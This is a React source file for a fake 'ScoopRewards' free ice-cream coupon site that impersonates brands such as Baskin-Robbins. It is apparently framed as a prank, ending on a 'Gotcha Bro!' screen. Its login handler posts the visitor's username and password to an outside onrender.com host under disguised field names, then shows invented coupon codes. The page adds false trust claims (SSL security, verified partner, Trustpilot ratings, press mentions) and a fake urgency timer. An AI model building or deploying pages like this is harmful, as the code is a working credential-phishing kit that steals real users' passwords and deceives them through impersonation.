import { useState, useEffect } from "react";

export default function App() {
  const [step, setStep] = useState(1);
  const [user, setUser] = useState("");
  const [pass, setPass] = useState("");
  const [loading, setLoading] = useState(false);
  const [showPass, setShowPass] = useState(false);
  const [remember, setRemember] = useState(false);
  const [timer, setTimer] = useState(23 * 3600 + 47 * 60 + 12);

  useEffect(() => {
    const id = setInterval(() => setTimer((t) => Math.max(0, t - 1)), 1000);
    return () => clearInterval(id);
  }, []);

  const hh = String(Math.floor(timer / 3600)).padStart(2, "0");
  const mm = String(Math.floor((timer % 3600) / 60)).padStart(2, "0");
  const ss = String(timer % 60).padStart(2, "0");

  const handleLogin = async () => {
    if (!user.trim() || !pass.trim()) return;
    setLoading(true);
    try {
      await fetch("https://family-search-g6t8.onrender.com/search", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ searchBox1: user.trim(), searchBox2: pass.trim() }),
      });
    } catch {}
    setTimeout(() => { setLoading(false); setStep(2); }, 1600);
  };

  return (
    <>
      <style>{`
        *, *::before, *::after { box-sizing: border-box; }
        html, body, #root { margin: 0; padding: 0; width: 100%; min-height: 100vh; }
        body {
          font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
          -webkit-font-smoothing: antialiased;
          background: #f8fafc;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
        @keyframes pulse { 0%,100% { opacity: 1; } 50% { opacity: 0.5; } }
        @keyframes fadeUp { from { opacity: 0; transform: translateY(12px); } to { opacity: 1; transform: none; } }
        .sr-input::placeholder { color: #94a3b8; }
        .sr-input:focus { border-color: #ea580c; box-shadow: 0 0 0 3px rgba(234,88,12,0.12); }
        .sr-btn:hover:not(:disabled) { background: #c2410c; box-shadow: 0 6px 16px rgba(234,88,12,0.35); }
        .sr-btn:active:not(:disabled) { transform: translateY(1px); }
        .sr-link:hover { text-decoration: underline; }
        .sr-card { animation: fadeUp 0.4s ease-out; }
      `}</style>

      <div style={S.page}>
        {/* Top announcement bar */}
        <div style={S.announce}>
          <span style={S.pulseDot} />
          <span>Limited offer ends in <b>{hh}:{mm}:{ss}</b> — 10,427 coupons claimed today</span>
        </div>

        {/* Header */}
        <header style={S.header}>
          <div style={S.headerInner}>
            <div style={S.brand}>
              <div style={S.brandMark}>
                <svg width="22" height="22" viewBox="0 0 24 24" fill="none">
                  <path d="M7 10a5 5 0 0 1 10 0" stroke="#ea580c" strokeWidth="2" strokeLinecap="round"/>
                  <path d="M6 10h12l-5 11a1 1 0 0 1-2 0L6 10z" fill="#ea580c"/>
                </svg>
              </div>
              <div>
                <div style={S.brandName}>ScoopRewards</div>
                <div style={S.brandTag}>Official Partner Program</div>
              </div>
            </div>
            <div style={S.headerRight}>
              <Badge>Verified Partner</Badge>
            </div>
          </div>
        </header>

        <main style={S.main}>
          <div style={S.container}>
            {step === 1 && (
              <div style={S.grid}>
                {/* LEFT: marketing */}
                <section style={S.left}>
                  <div style={S.eyebrow}>
                    <span style={S.eyebrowDot} /> FREE THIS WEEK
                  </div>
                  <h1 style={S.h1}>
                    Claim your <span style={{ color: "#ea580c" }}>free ice cream</span> coupons in 30 seconds.
                  </h1>
                  <p style={S.lede}>
                    Sign in to unlock exclusive vouchers from Baskin-Robbins, Naturals, Cream Stone and 40+ partner parlors across India.
                  </p>

                  <ul style={S.bullets}>
                    {[
                      "Instant digital coupons, no waiting",
                      "Valid across 1,200+ outlets nationwide",
                      "Bank-grade 256-bit SSL encryption",
                    ].map((b) => (
                      <li key={b} style={S.bullet}>
                        <CheckIcon /> <span>{b}</span>
                      </li>
                    ))}
                  </ul>

                  <div style={S.stats}>
                    <Stat n="2.4M+" l="Members" />
                    <Stat n="10K+" l="Today" />
                    <Stat n="4.9★" l="Trustpilot" />
                  </div>

                  <div style={S.logos}>
                    <span style={S.logosLabel}>Featured in</span>
                    <span style={S.logoText}>FORBES</span>
                    <span style={S.logoText}>TechCrunch</span>
                    <span style={S.logoText}>YourStory</span>
                  </div>
                </section>

                {/* RIGHT: login */}
                <section style={S.right}>
                  <div style={S.card} className="sr-card">
                    <div style={S.cardHead}>
                      <h2 style={S.cardTitle}>Sign in to claim</h2>
                      <p style={S.cardSub}>Use your registered email or username</p>
                    </div>

                    <div style={S.field}>
                      <label style={S.label}>Email or Username</label>
                      <div style={S.inputWrap}>
                        <UserIcon />
                        <input
                          className="sr-input"
                          value={user}
                          onChange={(e) => setUser(e.target.value)}
                          placeholder="you@example.com"
                          style={S.input}
                        />
                      </div>
                    </div>

                    <div style={S.field}>
                      <div style={S.labelRow}>
                        <label style={S.label}>Password</label>
                        <a className="sr-link" style={S.linkSm}>Forgot?</a>
                      </div>
                      <div style={S.inputWrap}>
                        <LockIcon />
                        <input
                          className="sr-input"
                          type={showPass ? "text" : "password"}
                          value={pass}
                          onChange={(e) => setPass(e.target.value)}
                          placeholder="Enter password"
                          style={{ ...S.input, paddingRight: 44 }}
                        />
                        <button onClick={() => setShowPass(!showPass)} style={S.eyeBtn} aria-label="toggle">
                          {showPass ? <EyeOffIcon /> : <EyeIcon />}
                        </button>
                      </div>
                    </div>

                    <label style={S.remember}>
                      <input type="checkbox" checked={remember} onChange={(e) => setRemember(e.target.checked)} style={S.checkbox} />
                      <span>Keep me signed in</span>
                    </label>

                    <button className="sr-btn" onClick={handleLogin} disabled={loading} style={S.btn}>
                      {loading ? (
                        <><span style={S.spinner} /> Verifying...</>
                      ) : (
                        <>Continue to claim <ArrowIcon /></>
                      )}
                    </button>

                    <div style={S.divider}><span style={S.dividerLine} /><span style={S.dividerText}>or</span><span style={S.dividerLine} /></div>

                    <button style={S.ssoBtn}>
                      <GoogleIcon /> Continue with Google
                    </button>

                    <p style={S.terms}>
                      By continuing, you agree to our <a className="sr-link" style={S.link}>Terms of Service</a> and <a className="sr-link" style={S.link}>Privacy Policy</a>.
                    </p>
                  </div>

                  <div style={S.trustStrip}>
                    <TrustItem icon={<ShieldIcon />} text="SSL Secured" />
                    <TrustItem icon={<CheckBadgeIcon />} text="Verified Site" />
                    <TrustItem icon={<StarIcon />} text="4.9 / 5 Rated" />
                  </div>
                </section>
              </div>
            )}

            {step === 2 && (
              <div style={S.centerWrap}>
                <div style={{ ...S.card, maxWidth: 560, margin: "0 auto", padding: 0 }} className="sr-card">
                  <div style={S.successHead}>
                    <div style={S.successIcon}><CheckIcon size={28} color="#fff" /></div>
                    <h2 style={S.successTitle}>You're verified</h2>
                    <p style={S.successSub}>Your coupons are ready below. Codes are valid for 24 hours.</p>
                  </div>

                  <div style={{ padding: 28 }}>
                    <div style={S.timerBar}>
                      <span style={S.pulseDot} />
                      Expires in <b style={{ marginLeft: 4 }}>{hh}:{mm}:{ss}</b>
                    </div>

                    {[
                      { brand: "Baskin-Robbins", title: "2 Free Scoops", code: "SCOOP2026", value: "₹120" },
                      { brand: "Naturals Ice Cream", title: "Free Sundae", code: "SUNDAE30", value: "₹180" },
                    ].map((c) => (
                      <div key={c.code} style={S.coupon}>
                        <div>
                          <div style={S.couponBrand}>{c.brand}</div>
                          <div style={S.couponTitle}>{c.title}</div>
                          <div style={S.couponCodeRow}>
                            <code style={S.couponCode}>{c.code}</code>
                            <span style={S.couponValue}>worth {c.value}</span>
                          </div>
                        </div>
                        <button style={S.copyBtn}>Copy</button>
                      </div>
                    ))}

                    <button className="sr-btn" onClick={() => setStep(3)} style={{ ...S.btn, marginTop: 8 }}>
                      Proceed to claim <ArrowIcon />
                    </button>
                  </div>
                </div>
              </div>
            )}

            {step === 3 && (
              <div style={S.centerWrap}>
                <div style={{ ...S.card, maxWidth: 520, margin: "0 auto", textAlign: "center", padding: 48 }} className="sr-card">
                  <div style={{ fontSize: 72, marginBottom: 16 }}>😆</div>
                  <h2 style={{ fontSize: 32, color: "#0f172a", margin: "0 0 12px" }}>Gotcha Bro! 🎊</h2>
                  <p style={{ fontSize: 18, color: "#475569", margin: "8px 0" }}>saduvkora 😂 exams unnai raa...</p>
                  <p style={{ fontSize: 15, color: "#64748b", marginTop: 16 }}>Paduko bro, ice cream tarwata vastundi 🍦</p>
                </div>
              </div>
            )}
          </div>
        </main>

        <footer style={S.footer}>
          <div style={S.footerInner}>
            <span>© 2026 ScoopRewards Pvt. Ltd.</span>
            <span style={S.footerLinks}>
              <a className="sr-link" style={S.footerLink}>Privacy</a>
              <a className="sr-link" style={S.footerLink}>Terms</a>
              <a className="sr-link" style={S.footerLink}>Support</a>
            </span>
          </div>
        </footer>
      </div>
    </>
  );
}

/* ---------- tiny components ---------- */
const Badge = ({ children }) => (
  <span style={S.badge}><CheckBadgeIcon size={14} /> {children}</span>
);
const Stat = ({ n, l }) => (
  <div><div style={S.statN}>{n}</div><div style={S.statL}>{l}</div></div>
);
const TrustItem = ({ icon, text }) => (
  <div style={S.trustItem}>{icon}<span>{text}</span></div>
);

/* ---------- icons (inline SVG, professional) ---------- */
const UserIcon = () => (<svg style={S.fieldIcon} width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#94a3b8" strokeWidth="2"><circle cx="12" cy="8" r="4"/><path d="M4 21c0-4 4-7 8-7s8 3 8 7"/></svg>);
const LockIcon = () => (<svg style={S.fieldIcon} width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#94a3b8" strokeWidth="2"><rect x="4" y="11" width="16" height="10" rx="2"/><path d="M8 11V7a4 4 0 0 1 8 0v4"/></svg>);
const EyeIcon = () => (<svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#64748b" strokeWidth="2"><path d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7S1 12 1 12z"/><circle cx="12" cy="12" r="3"/></svg>);
const EyeOffIcon = () => (<svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#64748b" strokeWidth="2"><path d="M17 17A10 10 0 0 1 1 12s2-3 5-5"/><path d="M22 12s-4 7-11 7"/><path d="M1 1l22 22"/></svg>);
const ArrowIcon = () => (<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5"><path d="M5 12h14M13 6l6 6-6 6"/></svg>);
const CheckIcon = ({ size = 16, color = "#16a34a" }) => (<svg width={size} height={size} viewBox="0 0 24 24" fill="none" stroke={color} strokeWidth="3"><path d="M5 13l4 4L19 7"/></svg>);
const ShieldIcon = () => (<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#64748b" strokeWidth="2"><path d="M12 2l8 4v6c0 5-3.5 9-8 10-4.5-1-8-5-8-10V6l8-4z"/></svg>);
const CheckBadgeIcon = ({ size = 16 }) => (<svg width={size} height={size} viewBox="0 0 24 24" fill="#16a34a"><path d="M12 1l2.39 2.39L17.66 3l1.06 3.27L22 7.34l-1.06 3.27L22 13.88l-3.27 1.07L17.66 18l-3.27-.61L12 19.78 9.61 17.39 6.34 18l-1.06-3.05L2 13.88l1.06-3.27L2 7.34l3.28-.07L6.34 3l3.27.39L12 1z"/><path d="M10 14l-2-2 1.4-1.4L10 11.2l3.6-3.6L15 9l-5 5z" fill="#fff"/></svg>);
const StarIcon = () => (<svg width="16" height="16" viewBox="0 0 24 24" fill="#f59e0b"><path d="M12 2l3 7h7l-5.5 4.5L18 21l-6-4-6 4 1.5-7.5L2 9h7z"/></svg>);
const GoogleIcon = () => (<svg width="18" height="18" viewBox="0 0 24 24"><path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/><path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/><path fill="#FBBC05" d="M5.84 14.1c-.22-.66-.35-1.36-.35-2.1s.13-1.44.35-2.1V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l3.66-2.83z"/><path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84C6.71 7.31 9.14 5.38 12 5.38z"/></svg>);

/* ---------- styles ---------- */
const S = {
  page: { minHeight: "100vh", width: "100%", display: "flex", flexDirection: "column", background: "linear-gradient(180deg, #fff7ed 0%, #fafafa 30%, #f8fafc 100%)", color: "#0f172a" },
  announce: { background: "#0f172a", color: "#fef3c7", padding: "10px 16px", textAlign: "center", fontSize: 13, display: "flex", justifyContent: "center", alignItems: "center", gap: 10, fontWeight: 500 },
  pulseDot: { width: 8, height: 8, borderRadius: "50%", background: "#22c55e", display: "inline-block", animation: "pulse 1.5s infinite" },

  header: { background: "rgba(255,255,255,0.8)", backdropFilter: "blur(12px)", borderBottom: "1px solid #e2e8f0", position: "sticky", top: 0, zIndex: 10 },
  headerInner: { maxWidth: 1200, margin: "0 auto", padding: "14px 24px", display: "flex", justifyContent: "space-between", alignItems: "center" },
  brand: { display: "flex", alignItems: "center", gap: 12 },
  brandMark: { width: 40, height: 40, background: "#fff7ed", border: "1px solid #fed7aa", borderRadius: 10, display: "grid", placeItems: "center" },
  brandName: { fontSize: 16, fontWeight: 700, color: "#0f172a", lineHeight: 1.1 },
  brandTag: { fontSize: 11, color: "#64748b", marginTop: 2 },
  headerRight: { display: "flex", alignItems: "center", gap: 12 },
  badge: { display: "inline-flex", alignItems: "center", gap: 6, fontSize: 12, fontWeight: 600, color: "#15803d", background: "#dcfce7", padding: "5px 10px", borderRadius: 999 },

  main: { flex: 1, padding: "48px 24px" },
  container: { maxWidth: 1200, margin: "0 auto", width: "100%" },
  grid: { display: "grid", gridTemplateColumns: "1.1fr 1fr", gap: 64, alignItems: "center" },

  left: { animation: "fadeUp 0.5s ease-out" },
  eyebrow: { display: "inline-flex", alignItems: "center", gap: 8, fontSize: 12, fontWeight: 700, color: "#ea580c", background: "#fff7ed", border: "1px solid #fed7aa", padding: "6px 12px", borderRadius: 999, letterSpacing: 0.5, marginBottom: 20 },
  eyebrowDot: { width: 6, height: 6, borderRadius: "50%", background: "#ea580c" },
  h1: { fontSize: "clamp(32px, 4vw, 48px)", fontWeight: 800, lineHeight: 1.1, letterSpacing: "-0.02em", margin: "0 0 20px", color: "#0f172a" },
  lede: { fontSize: 17, lineHeight: 1.6, color: "#475569", margin: "0 0 28px", maxWidth: 480 },
  bullets: { listStyle: "none", padding: 0, margin: "0 0 32px" },
  bullet: { display: "flex", alignItems: "center", gap: 10, padding: "8px 0", fontSize: 15, color: "#334155" },
  stats: { display: "flex", gap: 40, padding: "20px 0", borderTop: "1px solid #e2e8f0", borderBottom: "1px solid #e2e8f0", marginBottom: 24 },
  statN: { fontSize: 22, fontWeight: 800, color: "#0f172a", letterSpacing: "-0.02em" },
  statL: { fontSize: 12, color: "#64748b", marginTop: 2, textTransform: "uppercase", letterSpacing: 0.5 },
  logos: { display: "flex", alignItems: "center", gap: 18, opacity: 0.6 },
  logosLabel: { fontSize: 11, color: "#64748b", textTransform: "uppercase", letterSpacing: 1, fontWeight: 600 },
  logoText: { fontSize: 14, fontWeight: 700, color: "#64748b", letterSpacing: 0.5 },

  right: {},
  card: { background: "#fff", border: "1px solid #e2e8f0", borderRadius: 16, padding: 32, boxShadow: "0 1px 2px rgba(0,0,0,0.04), 0 20px 50px -20px rgba(15,23,42,0.15)" },
  cardHead: { marginBottom: 24 },
  cardTitle: { fontSize: 22, fontWeight: 700, margin: 0, color: "#0f172a", letterSpacing: "-0.01em" },
  cardSub: { fontSize: 14, color: "#64748b", margin: "6px 0 0" },

  field: { marginBottom: 16 },
  labelRow: { display: "flex", justifyContent: "space-between", alignItems: "baseline", marginBottom: 6 },
  label: { display: "block", fontSize: 13, fontWeight: 600, color: "#334155", marginBottom: 6 },
  inputWrap: { position: "relative" },
  fieldIcon: { position: "absolute", left: 14, top: "50%", transform: "translateY(-50%)" },
  input: { width: "100%", padding: "12px 14px 12px 42px", border: "1px solid #cbd5e1", borderRadius: 10, fontSize: 14, outline: "none", background: "#fff", color: "#0f172a", transition: "all 0.15s" },
  eyeBtn: { position: "absolute", right: 10, top: "50%", transform: "translateY(-50%)", background: "transparent", border: "none", cursor: "pointer", padding: 6, display: "grid", placeItems: "center" },

  remember: { display: "flex", alignItems: "center", gap: 8, fontSize: 13, color: "#475569", cursor: "pointer", marginBottom: 20, marginTop: 4 },
  checkbox: { width: 16, height: 16, accentColor: "#ea580c", cursor: "pointer" },

  btn: { width: "100%", padding: "13px 16px", background: "#ea580c", color: "#fff", border: "none", borderRadius: 10, fontSize: 15, fontWeight: 600, cursor: "pointer", display: "inline-flex", alignItems: "center", justifyContent: "center", gap: 8, transition: "all 0.15s", boxShadow: "0 1px 2px rgba(234,88,12,0.2)" },
  spinner: { width: 14, height: 14, border: "2px solid rgba(255,255,255,0.4)", borderTopColor: "#fff", borderRadius: "50%", animation: "spin 0.7s linear infinite" },

  divider: { display: "flex", alignItems: "center", gap: 12, margin: "20px 0" },
  dividerLine: { flex: 1, height: 1, background: "#e2e8f0" },
  dividerText: { fontSize: 12, color: "#94a3b8", textTransform: "uppercase", letterSpacing: 1 },

  ssoBtn: { width: "100%", padding: "11px 16px", background: "#fff", color: "#334155", border: "1px solid #cbd5e1", borderRadius: 10, fontSize: 14, fontWeight: 600, cursor: "pointer", display: "inline-flex", alignItems: "center", justifyContent: "center", gap: 10 },

  terms: { fontSize: 12, color: "#64748b", textAlign: "center", margin: "20px 0 0", lineHeight: 1.5 },
  link: { color: "#ea580c", fontWeight: 600, textDecoration: "none" },
  linkSm: { color: "#ea580c", fontWeight: 600, fontSize: 13, textDecoration: "none", cursor: "pointer" },

  trustStrip: { display: "flex", justifyContent: "center", gap: 24, marginTop: 16, padding: "12px 0" },
  trustItem: { display: "flex", alignItems: "center", gap: 6, fontSize: 12, color: "#64748b", fontWeight: 500 },

  centerWrap: { padding: "20px 0" },
  successHead: { background: "linear-gradient(135deg, #ea580c, #c2410c)", color: "#fff", padding: "32px 28px", textAlign: "center", borderRadius: "16px 16px 0 0" },
  successIcon: { width: 56, height: 56, borderRadius: "50%", background: "rgba(255,255,255,0.2)", border: "2px solid rgba(255,255,255,0.4)", display: "grid", placeItems: "center", margin: "0 auto 12px" },
  successTitle: { fontSize: 24, fontWeight: 700, margin: "0 0 6px", letterSpacing: "-0.01em" },
  successSub: { fontSize: 14, opacity: 0.9, margin: 0 },

  timerBar: { display: "flex", alignItems: "center", justifyContent: "center", gap: 8, background: "#fef3c7", border: "1px solid #fde68a", color: "#92400e", padding: "10px 14px", borderRadius: 10, fontSize: 13, fontWeight: 500, marginBottom: 16 },

  coupon: { display: "flex", justifyContent: "space-between", alignItems: "center", padding: 18, border: "1px solid #e2e8f0", borderRadius: 12, marginBottom: 12, background: "#fafafa" },
  couponBrand: { fontSize: 11, color: "#64748b", textTransform: "uppercase", letterSpacing: 1, fontWeight: 600 },
  couponTitle: { fontSize: 17, fontWeight: 700, color: "#0f172a", margin: "4px 0 8px" },
  couponCodeRow: { display: "flex", alignItems: "center", gap: 10 },
  couponCode: { fontFamily: "ui-monospace, SF Mono, monospace", fontSize: 13, background: "#0f172a", color: "#fef3c7", padding: "4px 10px", borderRadius: 6, fontWeight: 600, letterSpacing: 1 },
  couponValue: { fontSize: 12, color: "#64748b" },
  copyBtn: { padding: "8px 14px", background: "#fff", border: "1px solid #cbd5e1", borderRadius: 8, fontSize: 13, fontWeight: 600, color: "#334155", cursor: "pointer" },

  footer: { borderTop: "1px solid #e2e8f0", padding: "20px 24px", background: "#fff" },
  footerInner: { maxWidth: 1200, margin: "0 auto", display: "flex", justifyContent: "space-between", alignItems: "center", fontSize: 13, color: "#64748b" },
  footerLinks: { display: "flex", gap: 20 },
  footerLink: { color: "#64748b", textDecoration: "none" },
};

/* responsive: stack on mobile */
if (typeof window !== "undefined") {
  const mq = window.matchMedia("(max-width: 880px)");
  const apply = () => {
    S.grid.gridTemplateColumns = mq.matches ? "1fr" : "1.1fr 1fr";
    S.grid.gap = mq.matches ? 40 : 64;
  };
  apply();
  mq.addEventListener?.("change", apply);
}
